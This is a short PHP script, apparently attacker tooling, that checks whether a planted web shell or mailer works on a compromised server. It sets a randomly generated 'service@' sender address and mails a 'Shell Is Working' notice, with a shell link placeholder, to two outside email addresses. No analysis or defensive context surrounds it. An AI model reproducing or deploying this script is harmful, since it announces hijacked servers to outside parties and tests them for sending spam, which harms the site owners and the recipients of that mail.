SPyDonev1
<?php 
    ini_set( 'display_errors', 1 );
    error_reporting( E_ALL );
	$taz = "Link Shell: http://facebook.com" ; 
    $from = "service@".$dataHora = rand(100000000,100000000000000000);
    $to = "x1x2x3x@outlook.fr,tnxahmed@inbox.eu";
    $subject = "Mailer V2";
    $message = "Shell Is Working .".$taz;
    $headers = "From:" . $from;
    mail($to,$subject,$message, $headers);
    echo "Test email sent";
?>